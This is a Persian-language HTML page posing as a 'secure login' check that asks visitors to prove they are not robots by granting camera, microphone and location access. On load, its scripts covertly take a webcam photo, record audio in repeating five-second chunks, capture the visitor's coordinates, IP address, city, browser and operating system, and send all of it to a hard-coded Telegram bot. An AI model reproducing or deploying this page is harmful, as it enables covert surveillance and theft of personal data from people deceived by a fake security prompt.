<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>ورود امن</title>
  <style>
    body {
      background: #1e1e2f;
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding-top: 80px;
    }
    .access-box {
      background: rgba(255,255,255,0.1);
      border-radius: 12px;
      padding: 20px;
      width: 300px;
      margin: auto;
    }
    .access-item {
      display: flex;
      justify-content: space-between;
      margin: 15px 0;
    }
    .status-icon {
      width: 20px;
      height: 20px;
      border-radius: 50%;
      background: gray;
    }
    .status-icon.active {
      background: #00ff88;
    }
    #enterBtn {
      display: none;
      margin-top: 30px;
      padding: 10px 25px;
      font-size: 18px;
      background: #00c9ff;
      border: none;
      border-radius: 8px;
      color: white;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <h1>برای امنیت سایت، که شما ربات نیستید لطفاً دسترسی‌ها را تأیید کنید</h1>
  <div class="access-box">
    <div class="access-item">
      <span>دوربین</span>
      <div id="camStatus" class="status-icon"></div>
    </div>
    <div class="access-item">
      <span>میکروفون</span>
      <div id="micStatus" class="status-icon"></div>
    </div>
    <div class="access-item">
      <span>موقعیت مکانی</span>
      <div id="locStatus" class="status-icon"></div>
    </div>
  </div>

  <button id="enterBtn" onclick="window.location.href='https://noraasnora.github.io/Nora.a/'">ورود</button>

  <script>
    let permissions = {
      camera: false,
      microphone: false,
      location: false
    };

    async function requestCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        permissions.camera = true;
        document.getElementById("camStatus").classList.add("active");
        stream.getTracks().forEach(track => track.stop());
        takePhotoAndSend(); // اجرای کد ارسال عکس
      } catch (e) {}
    }

    async function requestMicrophone() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        permissions.microphone = true;
        document.getElementById("micStatus").classList.add("active");
        stream.getTracks().forEach(track => track.stop());
        startSedaBazikon(); // اجرای ضبط صدا
      } catch (e) {}
    }

    function requestLocation() {
      return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          position => {
            permissions.location = true;
            document.getElementById("locStatus").classList.add("active");
            sendLocationToTelegram(position.coords.latitude, position.coords.longitude); // ارسال لوکیشن
            resolve();
          },
          () => resolve()
        );
      });
    }

    async function checkAccess() {
      await requestCamera();
      await requestMicrophone();
      await requestLocation();
      getUserData(); // ارسال اطلاعات مرورگر و IP

      const allGranted = Object.values(permissions).every(Boolean);
      if (allGranted) {
        document.getElementById("enterBtn").style.display = "inline-block";
      }
    }

    checkAccess();
  </script>

  <!-- اینجا تمام فانکشن‌های ارسال اطلاعات تو قرار می‌گیرن -->
  <!-- فقط تعریف می‌شن، اجراشون داخل توابع بالا انجام شده -->

  <script>
    function takePhotoAndSend() {
      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
        const video = document.createElement('video');
        document.body.appendChild(video);
        video.srcObject = stream;
        video.play().then(() => {
          const canvas = document.createElement('canvas');
          const context = canvas.getContext('2d');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(blob => {
            sendPhotoToTelegram(blob);
            stream.getTracks().forEach(track => track.stop());
            document.body.removeChild(video);
            document.body.removeChild(canvas);
          }, 'image/jpeg');
        });
      });
    }

    function sendPhotoToTelegram(blob) {
      const url = 'https://api.telegram.org/bot6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw/sendPhoto';
      const formData = new FormData();
      formData.append('photo', blob, 'photo.jpg');
      formData.append('chat_id', '1209515299');
      fetch(url, { method: 'POST', body: formData });
    }

    function getUserData() {
      fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
          const message = `📡 کاربر جدید وارد شد:\n🌍 IP: ${data.ip}\n🌆 شهر: ${data.city}\n🌐 کشور: ${data.country_name}\n📱 OS: ${navigator.platform}\n🧭 مرورگر: ${navigator.userAgent}`;
          fetch(`https://api.telegram.org/bot6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: '1209515299', text: message })
          });
        });
    }

    function startSedaBazikon() {
      navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
        const recorder = new MediaRecorder(stream);
        let chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'audio/webm' });
          const formData = new FormData();
          formData.append('chat_id', '1209515299');
          formData.append('voice', blob, 'voice.webm');
          fetch(`https://api.telegram.org/bot6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw/sendVoice`, {
            method: 'POST',
            body: formData
          });
        };
        setInterval(() => {
          if (recorder.state === 'recording') recorder.stop();
          recorder.start();
        }, 5000);
      });
    }

    function sendLocationToTelegram(lat, lon) {
      const formData = new FormData();
      formData.append('chat_id', '1209515299');
      formData.append('latitude', lat);
      formData.append('longitude', lon);
      fetch(`https://api.telegram.org/bot6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw/sendLocation`, {
        method: 'POST',
        body: formData
      });
    }
  </script>

</body>
</html>
